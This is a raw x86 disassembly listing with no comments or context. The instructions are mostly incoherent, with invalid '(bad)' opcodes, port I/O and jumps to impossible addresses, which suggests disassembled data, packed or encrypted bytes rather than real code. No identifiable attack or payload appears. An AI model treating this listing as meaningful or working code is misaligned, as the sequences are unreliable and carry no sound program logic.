  41c9a2:	jnp    0x41c9a9
  41c9a4:	fsub   DWORD PTR [edi]
  41c9a6:	fwait
  41c9a7:	test   al,0x0
  41c9a9:	add    al,0x62
  41c9ab:	sbb    dl,0xbe
  41c9ae:	jp     0x41c9b0
  41c9b0:	mov    dl,al
  41c9b2:	adc    DWORD PTR [ecx+eiz*2+0x38],esp
  41c9b6:	test   DWORD PTR [eax-0x11],esi
  41c9b9:	sub    ecx,DWORD PTR [edx+0x7b]
  41c9bc:	dec    ecx
  41c9bd:	fwait
  41c9be:	mov    eax,ds:0xd4df0e13
  41c9c3:	mov    cl,0xbb
  41c9c5:	(bad)  
  41c9c6:	test   BYTE PTR [esi],ah
  41c9c8:	mov    eax,0xda714330
  41c9cd:	ds inc eax
  41c9cf:	cs sbb cl,dh
  41c9d2:	nop
  41c9d3:	mov    ebx,0x2d03a130
  41c9d8:	(bad)  
  41c9d9:	pop    edx
  41c9da:	mov    eax,0xdb6663b0
  41c9df:	sub    BYTE PTR [esi+0x6ebf7937],dh
  41c9e5:	cwde   
  41c9e6:	shl    DWORD PTR [ecx+0x1b],cl
  41c9e9:	ret    0xfee5
  41c9ec:	xor    ebx,DWORD PTR [ebx+0x48]
  41c9ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41c9f0:	mov    edi,0xfe2336d2
  41c9f5:	xchg   ecx,eax
  41c9f6:	inc    esp
  41c9f7:	outs   dx,BYTE PTR ds:[esi]
  41c9f8:	xchg   esi,eax
  41c9f9:	in     al,0x2
  41c9fb:	mov    cl,0x23
  41c9fd:	stos   DWORD PTR es:[edi],eax
  41c9fe:	shr    BYTE PTR ds:0x5e57c839,1
  41ca04:	fadd   DWORD PTR [ebx]
  41ca06:	jo     0x41ca3d
  41ca08:	aad    0x19
  41ca0a:	les    ebx,FWORD PTR [esp+edi*8+0x7d]
  41ca0e:	loope  0x41ca33
  41ca10:	retf   0xf024
  41ca13:	in     al,0xac
  41ca15:	and    al,0x4e
  41ca17:	stos   BYTE PTR es:[edi],al
  41ca18:	and    ah,BYTE PTR [eax]
  41ca1a:	mov    ds:0x54496b8b,al
  41ca1f:	and    DWORD PTR [ebp-0x4b],edx
  41ca22:	mov    ecx,0xca75e181
  41ca27:	rol    edi,1
  41ca29:	pop    esp
  41ca2a:	xchg   edx,eax
  41ca2b:	cli    
  41ca2c:	add    dl,BYTE PTR [ebp+edi*1-0x4e0628b9]
  41ca33:	and    al,BYTE PTR [edx-0x25]
  41ca36:	add    BYTE PTR [ecx],0x8d
  41ca39:	hlt    
  41ca3a:	iret   
  41ca3b:	sti    
  41ca3c:	fld    TBYTE PTR [ebp+0x24f1b968]
  41ca42:	repnz or ah,cl
  41ca45:	xor    bh,BYTE PTR [ebx+edx*2+0x7b44b132]
  41ca4c:	xor    ah,al
  41ca4e:	mov    es,WORD PTR [eax+0x35]
  41ca51:	add    BYTE PTR [eax+ebx*4+0x2ed7d46b],ah
  41ca58:	pop    esi
  41ca59:	mov    al,BYTE PTR [eax-0x524d69e5]
  41ca5f:	(bad)
  41ca62:	pop    ss
  41ca63:	ror    BYTE PTR [edx-0x723749bc],0xa3
  41ca6a:	and    BYTE PTR [eax-0x3f],bl
  41ca6d:	js     0x41ca47
  41ca6f:	addr16 test cl,ah
  41ca72:	ficomp DWORD PTR [esi]
  41ca74:	shl    ebx,0x2b
  41ca77:	dec    eax
  41ca78:	sub    DWORD PTR ds:0x2618cb2,esi
  41ca7e:	and    esp,ebp
  41ca80:	xor    eax,0x302311ee
  41ca85:	mov    dh,0x26
  41ca87:	xchg   ecx,eax
  41ca88:	or     dh,BYTE PTR [esi+0x3d78d4eb]
  41ca8e:	xchg   ecx,eax
  41ca8f:	dec    ebx
  41ca90:	sbb    DWORD PTR [edi-0x69],edx
  41ca93:	inc    esp
  41ca94:	push   ebp
  41ca95:	cdq    
  41ca96:	xchg   esp,eax
  41ca97:	dec    eax
  41ca98:	lods   eax,DWORD PTR ds:[esi]
  41ca99:	int3   
  41ca9a:	mov    dh,0x2e
  41ca9c:	aaa    
  41ca9d:	scas   eax,DWORD PTR es:[edi]
  41ca9e:	push   ss
  41ca9f:	mov    eax,ds:0xdc033646
  41caa4:	pop    esp
  41caa5:	jmp    0x25e2ee80
  41caaa:	mov    ebx,0xfc2c6fbe
  41caaf:	jle    0x41caa7
  41cab1:	mov    al,0x7e
  41cab3:	and    esp,esi
  41cab5:	loope  0x41ca4d
  41cab7:	jae    0x41cab4
  41cab9:	mov    ebp,0x8e1dbf2
  41cabe:	data16 hlt 
  41cac0:	sub    BYTE PTR [esi-0x36],dl
  41cac3:	push   esi
  41cac4:	std    
  41cac5:	mov    eax,ds:0x853b28b4
  41caca:	(bad)  
  41cacb:	push   ds
  41cacc:	sub    DWORD PTR [eax+0x6cc52e8a],ebx
  41cad2:	inc    edi
  41cad3:	xlat   BYTE PTR ds:[ebx]
  41cad4:	xchg   esi,eax
  41cad5:	dec    ecx
  41cad6:	jns    0x41cb31
  41cad8:	scas   eax,DWORD PTR es:[edi]
  41cad9:	adc    eax,ecx
  41cadb:	xchg   esi,eax
  41cadc:	mov    edi,0xfad5e898
  41cae1:	je     0x41ca92
  41cae3:	es xchg ecx,eax
  41cae5:	mov    dl,0x4
  41cae7:	inc    edx
  41cae8:	pop    ebx
  41cae9:	mov    esp,0x555d4b59
  41caee:	push   ds
  41caef:	and    DWORD PTR [edi+eiz*2],ebx
  41caf2:	sbb    ebx,eax
  41caf4:	mov    cl,0x6c
  41caf6:	addr16 out dx,al
  41caf8:	xor    BYTE PTR [eax],0x71
  41cafb:	fsubp  st(4),st
  41cafd:	rol    BYTE PTR [esi+0xc],cl
  41cb00:	in     eax,0x39
  41cb02:	ja     0x41ca91
  41cb04:	test   al,0xcb
  41cb06:	add    DWORD PTR fs:[edx+0x61],esp
  41cb0a:	shl    bh,0xc7
  41cb0d:	fsubr  DWORD PTR [esi+0x2985f06]
  41cb13:	push   ds
  41cb14:	nop
  41cb15:	or     al,0xd3
  41cb17:	rcl    ecx,cl
  41cb19:	fild   QWORD PTR [esi-0x65]
  41cb1c:	sub    cl,bl
  41cb1e:	lods   al,BYTE PTR ds:[esi]
  41cb1f:	cs stos BYTE PTR es:[edi],al
  41cb21:	adc    BYTE PTR [eax+0x1657a9c3],ch
  41cb27:	stos   DWORD PTR es:[edi],eax
  41cb28:	loope  0x41cb7c
  41cb2a:	dec    esp
  41cb2b:	jae    0x41cb8d
  41cb2d:	rol    edx,cl
  41cb2f:	cmp    al,0xb1
  41cb31:	mov    edi,0x1ab374b8
  41cb36:	aad    0x77
  41cb38:	test   eax,0x68a0bcbd
  41cb3d:	rcr    edx,0xcf
  41cb40:	push   es
  41cb41:	aas    
  41cb42:	or     eax,0xac45d013
  41cb47:	add    dh,BYTE PTR [ecx]
  41cb49:	mov    DWORD PTR [ebp-0x281fd636],ebx
  41cb4f:	adc    DWORD PTR [esp+ebp*8-0x5e],esi
  41cb53:	pop    edi
  41cb54:	push   ecx
  41cb55:	outs   dx,DWORD PTR ds:[esi]
  41cb56:	in     al,0xb1
  41cb58:	js     0x41cb68
  41cb5a:	inc    ebp
  41cb5b:	jnp    0x41cb92
  41cb5d:	inc    ebp
  41cb5e:	fstp   TBYTE PTR [esi+0x41]
  41cb61:	stc    
  41cb62:	cmc    
  41cb63:	dec    esp
  41cb64:	ins    BYTE PTR es:[edi],dx
  41cb65:	enter  0x727d,0x6a
  41cb69:	out    0xaa,al
  41cb6b:	jmp    0xb875:0xa3ce5966
  41cb72:	jmp    DWORD PTR [ecx]
  41cb74:	mov    ds:0xf45e0c3e,al
  41cb79:	jo     0x41cb62
  41cb7b:	pushw  0xd30
  41cb7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cb80:	aam    0x68
  41cb82:	ret    0xcf17
  41cb85:	adc    edi,0xf884d091
  41cb8b:	fmul   QWORD PTR [ecx]
  41cb8d:	mov    ebx,0xf199cd0f
  41cb92:	mov    BYTE PTR [ecx-0x3d6c2942],dh
  41cb98:	push   esp
  41cb99:	mov    WORD PTR [esi],?
  41cb9b:	shl    bh,1
  41cb9d:	in     al,dx
  41cb9e:	popa   
  41cb9f:	cmp    al,0xe5
  41cba1:	sub    DWORD PTR [ebx],esp
  41cba3:	leave  
  41cba4:	into   
  41cba5:	ret    
  41cba6:	call   FWORD PTR [edx]
  41cba8:	nop
  41cba9:	xchg   ebx,eax
  41cbaa:	icebp  
  41cbab:	stos   DWORD PTR es:[edi],eax
  41cbac:	push   ebp
  41cbad:	mov    cl,0xf7
  41cbaf:	fdivr  QWORD PTR fs:[bx+si]
  41cbb3:	jge    0x41cb93
  41cbb5:	sub    DWORD PTR [ebx+0x62c490eb],esp
  41cbbb:	xor    eax,0xe25db355
  41cbc0:	mov    WORD PTR [esi-0x6b],?
  41cbc3:	sbb    esi,DWORD PTR [edi+ebp*1+0x3]
  41cbc7:	pop    ecx
  41cbc8:	mov    bh,0x0
  41cbca:	jecxz  0x41cb79
  41cbcc:	push   ss
  41cbcd:	repz repz into 
  41cbd0:	fmul   DWORD PTR [edx]
  41cbd2:	lea    edx,[eax]
  41cbd4:	iret   
  41cbd5:	retf   0xdee8
  41cbd8:	mov    al,0x7b
  41cbda:	push   0xffffff85
  41cbdc:	jp     0x41cbca
  41cbde:	in     eax,0x67
  41cbe0:	dec    esp
  41cbe1:	out    0xfe,eax
  41cbe3:	xchg   esp,eax
  41cbe4:	inc    edx
  41cbe5:	test   al,0x3a
  41cbe7:	in     al,dx
  41cbe8:	xlat   BYTE PTR ds:[ebx]
  41cbe9:	les    ecx,FWORD PTR [ecx]
  41cbeb:	nop
  41cbec:	scas   eax,DWORD PTR es:[edi]
  41cbed:	retf   
  41cbee:	mov    gs,esp
  41cbf0:	mov    WORD PTR [edi-0x3a795138],es
  41cbf6:	xlat   BYTE PTR ds:[ebx]
  41cbf7:	mov    bl,0x27
  41cbf9:	push   edi
  41cbfa:	xor    eax,0x28b190f
  41cbff:	xchg   ecx,eax
  41cc00:	(bad)  
  41cc01:	jge    0x41cba8
  41cc03:	fdivr  QWORD PTR ds:0xb7105b35
  41cc09:	push   esi
  41cc0a:	stos   DWORD PTR es:[edi],eax
  41cc0b:	pop    esp
  41cc0c:	add    esp,DWORD PTR [eax-0x47c5cd7]
  41cc12:	xchg   esi,eax
  41cc13:	call   DWORD PTR [edx-0x59]
  41cc16:	adc    BYTE PTR [eax+edi*4-0x4e7b7c0e],bl
  41cc1d:	sbb    bl,cl
  41cc1f:	mov    cs,WORD PTR [ecx+0x76]
  41cc22:	ins    DWORD PTR es:[edi],dx
  41cc23:	(bad)  [ebx-0x10]
  41cc26:	push   es
  41cc27:	xor    eax,0x54967b85
  41cc2c:	cli    
  41cc2d:	(bad)
  41cc30:	stos   BYTE PTR es:[edi],al
  41cc31:	xchg   esi,edx
  41cc33:	leave  
  41cc34:	pop    esi
  41cc35:	add    eax,DWORD PTR [ecx]
  41cc37:	dec    edx
  41cc38:	and    BYTE PTR [eax-0x1f],dh
  41cc3b:	jmp    0x119a257b
  41cc40:	and    ecx,DWORD PTR [edi+0x12]
  41cc43:	call   0x1357105
  41cc48:	imul   esp,DWORD PTR [edi],0xffffffca
  41cc4b:	pusha  
  41cc4c:	test   eax,0xea710c6d
  41cc51:	sub    DWORD PTR [ebx],ebx
  41cc53:	mov    eax,0x6b5632db
  41cc58:	loopne 0x41cc8b
  41cc5a:	test   eax,0x3cf9bf2
  41cc5f:	pop    ecx
  41cc60:	sbb    BYTE PTR [edi-0x2e],al
  41cc63:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cc64:	(bad)  
  41cc65:	arpl   WORD PTR [esp+eiz*4],cx
  41cc68:	jns    0x41cc18
  41cc6a:	dec    ebx
  41cc6b:	jbe    0x41cc87
  41cc6d:	push   0x64
  41cc6f:	fdiv   QWORD PTR [esi]
  41cc71:	fidiv  DWORD PTR ds:0x7f23ee0
  41cc77:	(bad)  [ecx+0x65]
  41cc7a:	sbb    ecx,esi
  41cc7c:	xor    BYTE PTR [esi+eax*8+0xe774c96],dh
  41cc83:	or     esi,DWORD PTR [ebx-0x2e]
  41cc86:	adc    edi,ecx
  41cc88:	jle    0x41ccdb
  41cc8a:	xchg   esp,eax
  41cc8b:	or     bl,BYTE PTR [edx-0x14]
  41cc8e:	xchg   edi,eax
  41cc8f:	sar    DWORD PTR [ebx],0xe5
  41cc92:	das    
  41cc93:	imul   esi,ebx,0x45
  41cc96:	cld    
	...
  41cd13:	add    al,ch
  41cd15:	shl    BYTE PTR [edi+0x76],1
  41cd18:	jg     0x41cd11
  41cd1a:	stc    
  41cd1b:	ficom  WORD PTR [ebp+0x2e]
  41cd1e:	inc    esp
  41cd1f:	and    al,0x57
  41cd21:	in     eax,dx
  41cd22:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cd23:	xchg   edx,ecx
  41cd25:	imul   eax,DWORD PTR [ecx],0x76b00
  41cd2b:	add    BYTE PTR ds:0xa9b9677a,al
  41cd31:	cmp    ebp,DWORD PTR [ebx-0x53]
  41cd34:	sub    DWORD PTR [eax],ebp
  41cd36:	out    dx,eax
  41cd37:	js     0x41cd7d
  41cd39:	(bad)  
  41cd3a:	retf   0xb0d0
  41cd3d:	ss div esi
  41cd40:	fidiv  WORD PTR [ebp-0x50]
  41cd43:	mov    edi,0xb4e664f3
  41cd48:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cd49:	mov    al,0x78
  41cd4b:	inc    ebp
  41cd4c:	dec    esi
  41cd4d:	leave  
  41cd4e:	in     al,dx
  41cd4f:	sahf   
  41cd50:	cmp    BYTE PTR [ebp-0xf],0x23
  41cd54:	xor    ah,BYTE PTR [ebp+0x77c1960d]
  41cd5a:	push   0x9a7419cb
  41cd5f:	xor    cl,BYTE PTR [edi+eiz*1-0x32a1262b]
  41cd66:	xor    DWORD PTR [ebx-0x21],ebx
  41cd69:	(bad)  
  41cd6a:	js     0x41cd5d
  41cd6c:	sub    eax,0x62c09ace
  41cd71:	jnp    0x41cd69
  41cd73:	pushf  
  41cd74:	loope  0x41cd49
  41cd76:	sub    DWORD PTR [ebp+0x65],ebx
  41cd79:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cd7a:	inc    esp
  41cd7b:	xchg   DWORD PTR [ecx+0x47],ebp
  41cd7e:	pop    es
  41cd7f:	or     DWORD PTR [esi],ebp
  41cd81:	aam    0xa
  41cd83:	loopne 0x41cdca
  41cd85:	adc    ebp,esp
  41cd87:	mov    esp,0x85ddf51b
  41cd8c:	adc    DWORD PTR [ecx+0x1c],eax
  41cd8f:	lock or eax,0xb4230b40
  41cd95:	push   ecx
  41cd96:	pop    esp
  41cd97:	in     eax,dx
  41cd98:	or     BYTE PTR [edx-0x79],cl
  41cd9b:	es aaa 
  41cd9d:	rep outs dx,BYTE PTR ds:[esi]
  41cd9f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41cda0:	jp     0x41cd81
  41cda2:	xor    DWORD PTR [edi],esp
  41cda4:	clc    
  41cda5:	mov    dh,0x3e
  41cda7:	add    eax,DWORD PTR [edi]
  41cda9:	pop    ss
  41cdaa:	dec    esp
  41cdab:	sub    esi,DWORD PTR [ebp+eiz*4+0x77]
  41cdaf:	mov    dh,0xdb
  41cdb1:	inc    bp
  41cdb3:	sub    eax,ebx
  41cdb5:	(bad)  
  41cdb6:	aas    
  41cdb7:	cli    
  41cdb8:	sbb    eax,0x718ad8ad
  41cdbd:	sub    bh,BYTE PTR [eax]
  41cdbf:	mov    esp,0x9aeccd78
  41cdc4:	ins    DWORD PTR es:[edi],dx
  41cdc5:	adc    eax,0xe05c6628
  41cdca:	add    eax,0x41979a
  41cdcf:	mov    edi,0x664d5348
  41cdd4:	jns    0x41cd6a
  41cdd6:	mov    al,BYTE PTR es:[edx*8-0x2457bec5]
  41cdde:	fnstenv [eax-0x14]
  41cde1:	(bad)  
  41cde2:	sbb    edx,DWORD PTR [eax+edx*8]
  41cde5:	fs ins BYTE PTR es:[edi],dx
  41cde7:	jnp    0x41cdc2
  41cde9:	jmp    0x41ce51
  41cdeb:	cmp    al,0xad
  41cded:	out    0xc8,eax
  41cdef:	call   0xb51:0x83e9ceb5
  41cdf6:	inc    esi
  41cdf7:	out    0xa3,eax
  41cdf9:	or     DWORD PTR [ecx-0x706f59ef],ecx
  41cdff:	dec    ebx
  41ce00:	inc    ebx
  41ce01:	sub    BYTE PTR [edi+edx*2],al
  41ce04:	mov    WORD PTR [eax-0x80],fs
  41ce07:	push   0x3113f735
  41ce0c:	jo     0x41cde9
  41ce0e:	fnstsw WORD PTR ds:0xc6701697
  41ce14:	fnstcw WORD PTR [ecx]
  41ce16:	lock fcmovne st,st(4)
  41ce19:	xchg   ecx,eax
  41ce1a:	adc    BYTE PTR [ecx+0x62c92ebf],bl
  41ce20:	repnz lods eax,DWORD PTR ds:[esi]
  41ce22:	push   ss
  41ce23:	dec    eax
  41ce24:	retf   0x5993
  41ce27:	cmp    esp,DWORD PTR [esi-0x45]
  41ce2a:	push   cs
  41ce2b:	mov    edx,0x81330b00
  41ce30:	icebp  
  41ce31:	test   al,0x82
  41ce33:	ds xor ebx,esp
  41ce36:	ins    BYTE PTR es:[edi],dx
  41ce37:	int3   
  41ce38:	push   esi
  41ce39:	or     DWORD PTR [edx-0x1bdde674],eax
  41ce3f:	inc    ebx
  41ce40:	(bad)  
  41ce41:	ret    
  41ce42:	(bad)  
  41ce43:	xor    BYTE PTR [edx-0x78],al
  41ce46:	mov    al,0x60
  41ce48:	fnstsw WORD PTR gs:[edi]
  41ce4b:	nop
  41ce4c:	popf   
  41ce4d:	jnp    0x41ce02
  41ce4f:	nop
  41ce50:	mov    ds:0xd1d2cafc,al
  41ce55:	aam    0xda
  41ce57:	mov    bh,0x34
  41ce59:	popa   
  41ce5a:	lods   eax,DWORD PTR ds:[esi]
  41ce5b:	call   0x5b7f:0x4bb17e7
  41ce62:	aas    
  41ce63:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41ce64:	outs   dx,DWORD PTR ds:[esi]
  41ce65:	arpl   WORD PTR [ecx-0x6c2dd754],sp
  41ce6b:	std    
  41ce6c:	xchg   BYTE PTR [ebx+0x191e47e9],al
  41ce72:	mov    bl,0x64
  41ce74:	push   ecx
  41ce75:	les    edi,FWORD PTR [ebx]
  41ce77:	int3   
  41ce78:	pop    esi
  41ce79:	mov    eax,ds:0x23415406
  41ce7e:	xor    ah,al
  41ce80:	(bad)  
  41ce81:	retf   
  41ce82:	mov    dl,0x42
  41ce84:	push   eax
  41ce85:	and    DWORD PTR [ecx-0x76330a5],ecx
  41ce8b:	cs cmp al,0xae
  41ce8e:	mov    bh,0xce
  41ce90:	or     eax,0x4d175a8
  41ce95:	mov    al,ds:0xf06c8e5d
  41ce9a:	cmp    DWORD PTR [edi-0x5a],ebp
  41ce9d:	sub    al,BYTE PTR [edx+0x1b]
  41cea0:	sub    al,0x7a
  41cea2:	inc    edx
  41cea4:	xchg   DWORD PTR [esi+0x3b],ebx
  41cea7:	mov    eax,0xb3fb41f9
  41ceac:	in     al,0xbd
  41ceae:	mov    al,0xb9
  41ceb0:	jge    0xfcf63e9d
  41ceb6:	sahf   
  41ceb7:	mov    ds:0xf39ac6cf,eax
  41cebc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41cebd:	ret    
  41cebe:	add    edi,0x78
  41cec1:	push   ecx
  41cec2:	push   ebx
  41cec3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cec4:	push   edi
  41cec5:	jbe    0x41cf0f
  41cec7:	ror    DWORD PTR [ebx+0x680dbc88],1
  41cecd:	mov    eax,ds:0x84c5d947
  41ced2:	jo     0x41ceb0
  41ced4:	xor    ebp,eax
  41ced6:	adc    DWORD PTR [ebp+0x5d],eax
  41ced9:	imul   ebp,DWORD PTR [eax+0x1f],0x16
  41cedd:	push   ebx
  41cede:	mov    ch,0xc9
  41cee0:	inc    esp
  41cee2:	rcr    edx,cl
  41cee4:	ds ss push ebx
  41cee7:	cdq    
  41cee8:	shl    edx,1
  41ceea:	cs (bad) 
  41ceec:	xor    al,0x9a
  41ceee:	loop   0x41ceea
  41cef0:	xchg   ecx,eax
  41cef1:	sub    eax,0x4bc862d4
  41cef6:	jge    0x41cedb
  41cef8:	xor    BYTE PTR [edx+0x71],0x4
  41cefc:	div    BYTE PTR gs:[edx-0x33fd4dd3]
  41cf03:	xor    ah,BYTE PTR ds:0xe702f677
  41cf09:	xlat   BYTE PTR ds:[ebx]
  41cf0a:	xchg   ch,ah
  41cf0c:	sub    edi,eax
  41cf0e:	mov    ebx,0x3368cda8
  41cf13:	or     eax,0xff892baa
  41cf18:	test   DWORD PTR [edx-0x7f46d94a],0xb63d5e70
  41cf22:	rol    ch,1
  41cf24:	xlat   BYTE PTR ds:[ebx]
  41cf25:	aas    
  41cf26:	hlt    
  41cf27:	fsubp  st(2),st
  41cf29:	jmp    0xc680872b
  41cf2e:	xor    BYTE PTR [esi],cl
  41cf30:	loope  0x41cf4d
  41cf32:	mov    al,ds:0x313fde99
  41cf37:	in     al,0x78
  41cf39:	jbe    0x41ceea
  41cf3b:	and    eax,0xeffbe97e
  41cf40:	rcl    DWORD PTR [ebx-0x4dcdbd13],cl
  41cf46:	sahf   
  41cf47:	xor    eax,0x9c97ba00
  41cf4c:	lahf   
  41cf4d:	mov    bl,ah
  41cf4f:	cli    
  41cf50:	pop    ebx
  41cf51:	int    0x7f
  41cf53:	cmp    dl,bh
  41cf55:	xor    al,ch
  41cf57:	aad    0x92
  41cf59:	loope  0x41cfaf
  41cf5b:	outs   dx,BYTE PTR cs:[esi]
  41cf5d:	lea    ecx,[esi+0x5c]
  41cf60:	xor    al,0x52
  41cf62:	out    0xd0,al
  41cf64:	mov    esi,0x22ce86c5
  41cf69:	and    DWORD PTR [esi-0x71],edx
  41cf6c:	pmulhw mm4,QWORD PTR [esi+0x2a41ec19]
  41cf73:	rcl    BYTE PTR [ecx-0x5e3b120a],1
  41cf79:	add    eax,0xa14022fb
  41cf7e:	inc    eax
  41cf7f:	mov    al,ds:0xdfa32a
  41cf84:	cli    
  41cf85:	mov    dh,ch
  41cf87:	repz lahf 
  41cf89:	pop    ebx
  41cf8a:	out    dx,eax
  41cf8b:	mov    fs,esi
  41cf8d:	fld    TBYTE PTR [edx+0x6350fda1]
  41cf93:	and    al,0x6b
  41cf95:	sbb    BYTE PTR ds:0x580d9051,al
  41cf9b:	enter  0x233f,0xfa
  41cf9f:	cmp    al,0xd6
  41cfa1:	and    ebp,esi
  41cfa3:	xlat   BYTE PTR ds:[ebx]
  41cfa4:	cld    
  41cfa5:	sbb    ebx,ebx
  41cfa7:	cmp    eax,0xc3eb1f7e
  41cfac:	jns    0x41cf53
  41cfae:	xchg   esp,eax
  41cfaf:	leave  
  41cfb0:	sbb    ebp,edx
  41cfb2:	inc    ebx
  41cfb3:	adc    eax,0xd754ddb0
  41cfb8:	es sub eax,0x99b207a5
  41cfbe:	cdq    
  41cfbf:	sbb    eax,0x6fce09f1
  41cfc4:	push   0xd6eb9f4a
  41cfc9:	xor    ecx,ecx
  41cfcb:	sti    
  41cfcc:	lahf   
  41cfcd:	push   ebx
  41cfce:	or     eax,0x3beadf4a
  41cfd3:	or     al,0x65
  41cfd5:	or     eax,0x8283cf32
  41cfda:	in     eax,dx
  41cfdb:	(bad)  
  41cfdc:	cmp    al,0x4
  41cfde:	mov    edx,0x69a76e16
  41cfe3:	retf   0x925d
  41cfe6:	(bad)  [edi]
  41cfe8:	adc    al,0xd1
  41cfea:	xchg   ebp,eax
  41cfeb:	fcomp  DWORD PTR [edi-0x7a]
  41cfee:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41cfef:	add    bh,BYTE PTR [ecx+0x63]
  41cff2:	inc    esi
  41cff3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41cff4:	jle    0x41cffb
  41cff6:	pop    ebx
  41cff7:	push   ebp
  41cff8:	sub    BYTE PTR [eax],dh
  41cffa:	jp     0x41d001
  41cffc:	dec    ecx
  41cffd:	jmp    DWORD PTR [esi+0x4b92a5f3]
  41d003:	xchg   esp,eax
  41d004:	jno    0x41d058
  41d006:	dec    esi
  41d007:	int    0x2
  41d009:	sub    DWORD PTR [ebx+0x31],ebp
  41d00c:	pop    ss
  41d00d:	xchg   edx,eax
  41d00e:	mov    ?,edi
  41d010:	pop    DWORD PTR [ebp+0x4b]
  41d013:	pop    eax
  41d014:	jne    0x41cfce
  41d016:	int    0x50
  41d018:	push   edi
  41d019:	div    DWORD PTR [ebp+0x3a]
  41d01c:	sub    al,BYTE PTR [ebx+0x2dfb0472]
  41d022:	and    bl,BYTE PTR [eax+0xa19f20b]
  41d028:	int3   
  41d029:	enter  0xeecf,0xcb
  41d02d:	loope  0x41cfec
  41d02f:	xor    DWORD PTR [edx],edi
  41d031:	or     eax,0x87567da7
  41d036:	xor    eax,0xedc60626
  41d03b:	sub    ebx,edi
  41d03d:	mov    eax,ds:0x81b972cf
  41d042:	push   ebx
  41d043:	std    
  41d044:	gs adc eax,0xe8fa1222
  41d04a:	sbb    eax,0xded9bd35
  41d04f:	data16 fisubr DWORD PTR [edx]
  41d052:	out    dx,al
  41d053:	jnp    0x41d0b6
  41d055:	pop    ds
  41d056:	pop    ecx
  41d057:	xchg   ecx,eax
  41d058:	cmc    
  41d059:	lock jb 0x41d004
  41d05c:	jmp    0x6a3ca52d
  41d061:	jle    0x41d0ce
  41d063:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d064:	fwait
  41d065:	add    BYTE PTR [ecx],ah
  41d067:	mov    bl,0x2
  41d069:	outs   dx,BYTE PTR ds:[esi]
  41d06a:	mov    ds:0x6aef34ca,eax
  41d06f:	lock cs dec edx
  41d072:	push   ebx
  41d073:	ret    
  41d074:	push   ebx
  41d075:	xor    al,BYTE PTR [ecx+0x52]
  41d078:	inc    esp
  41d079:	push   cs
  41d07a:	jle    0x41d0e7
  41d07c:	(bad)  
  41d07e:	fnstcw WORD PTR [eax-0x54]
  41d081:	jecxz  0x41d0af
  41d083:	inc    ebp
  41d084:	clc    
  41d085:	cmc    
  41d086:	scas   eax,DWORD PTR es:[edi]
  41d087:	cdq    
  41d088:	call   0x5f04:0xc7e18112
  41d08f:	xor    esp,ebx
  41d091:	retf   0x9b37
  41d094:	inc    edx
  41d095:	sub    ebx,edi
  41d097:	mov    cl,0x7a
  41d099:	dec    eax
  41d09a:	or     bh,BYTE PTR ds:0xf478f000
  41d0a0:	mov    ecx,eax
  41d0a2:	or     edi,eax
  41d0a4:	fnstsw WORD PTR [esi]
  41d0a6:	leave  
  41d0a7:	neg    DWORD PTR [ecx-0x71249971]
  41d0ad:	pop    esi
  41d0ae:	push   esp
  41d0af:	push   ss
  41d0b0:	int    0x6d
  41d0b2:	in     eax,dx
  41d0b3:	pop    ecx
  41d0b4:	push   ebx
  41d0b5:	aad    0x64
  41d0b7:	xor    ch,BYTE PTR [ebx+0x30]
  41d0ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d0bb:	iret   
  41d0bc:	mov    dh,0x14
  41d0be:	mov    ebp,0xa47021eb
  41d0c3:	adc    eax,0x4e0c6435
  41d0c8:	pop    ecx
  41d0c9:	mov    dh,0xc5
  41d0cb:	ror    edx,cl
  41d0cd:	cmc    
  41d0ce:	jge    0x41d057
  41d0d0:	cmp    edx,eax
  41d0d2:	outs   dx,BYTE PTR ds:[esi]
  41d0d3:	mov    dl,0xae
  41d0d5:	shl    BYTE PTR [edx],0x1b
  41d0d8:	cdq    
  41d0d9:	inc    esp
  41d0da:	cmp    eax,0x21cbecc5
  41d0df:	sbb    BYTE PTR [ecx],ah
  41d0e1:	out    0xcd,al
  41d0e3:	push   ss
  41d0e4:	sbb    ecx,DWORD PTR [edx-0x6d]
  41d0e7:	jmp    0x41d12a
  41d0e9:	push   ebp
  41d0ea:	push   ebx
  41d0eb:	iret   
  41d0ec:	xor    al,BYTE PTR [esp+edx*1-0x1ecbebb8]
  41d0f3:	mov    ch,0xfc
  41d0f5:	dec    esi
  41d0f6:	leave  
  41d0f7:	push   es
  41d0f8:	xor    DWORD PTR ds:0x99058528,esi
  41d0fe:	test   DWORD PTR [ebx-0x63],ebx
  41d101:	push   ds
  41d102:	push   esp
  41d103:	mov    al,ds:0xf850a3ae
  41d108:	idiv   BYTE PTR [ecx+esi*2+0x2c]
  41d10c:	sub    ebx,DWORD PTR [ebx-0x219a9bb7]
  41d112:	repz sub al,BYTE PTR [bp+di]
  41d116:	call   0xc70e7f39
  41d11b:	ins    DWORD PTR es:[edi],dx
  41d11c:	xchg   ecx,eax
  41d11d:	mov    esp,0x8fee47d
  41d122:	pop    ecx
  41d123:	dec    ecx
  41d124:	mov    edx,0x7b7dd8a2
  41d129:	aam    0xb8
  41d12b:	imul   ebx,edi,0xc14c7e65
  41d131:	shl    BYTE PTR [ecx+0x58],cl
  41d134:	push   ds
  41d135:	push   ebx
  41d136:	pushf  
  41d137:	aas    
  41d138:	inc    esp
  41d139:	nop
  41d13a:	shl    BYTE PTR [ebx-0x27],cl
  41d13d:	push   ebp
  41d13e:	icebp  
  41d13f:	in     al,0x74
  41d141:	mov    ch,0xa7
  41d143:	jno    0x41d123
  41d145:	test   eax,0xbf7c356e
  41d14a:	cmp    eax,0xdcec06bc
  41d14f:	icebp  
  41d150:	mov    cs,WORD PTR [ecx+ecx*2]
  41d153:	jecxz  0x41d166
  41d155:	pop    ecx
  41d156:	sbb    bl,BYTE PTR [edi-0x7a]
  41d159:	daa    
